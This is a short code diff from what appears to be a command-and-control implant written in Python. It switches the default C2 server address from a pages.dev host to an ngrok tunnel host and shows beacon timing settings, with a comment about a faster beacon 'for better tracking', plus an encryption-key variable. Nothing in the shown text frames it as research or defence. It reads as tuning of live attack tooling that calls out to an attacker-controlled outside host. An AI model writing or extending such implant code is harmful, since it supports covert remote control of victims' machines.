@@ -26,7 +26,7 @@ except ImportError:
     _resource_monitor_loaded = False
 
 # ─── Configuration ─────────────────────────────────────────────────────────────
-C2_URL   = os.environ.get("C2_URL",    "https://gbctwoserver.pages.dev")
+C2_URL   = os.environ.get("C2_URL",    "https://lynelle-scroddled-corinne.ngrok-free.dev")
 SLEEP    = int(os.environ.get("SLEEP",  "3"))  # Faster beacon for better tracking
 JITTER   = int(os.environ.get("JITTER", "5"))   # Lower jitter
 ENC_KEY  = os.environ.get("ENC_KEY",   "")
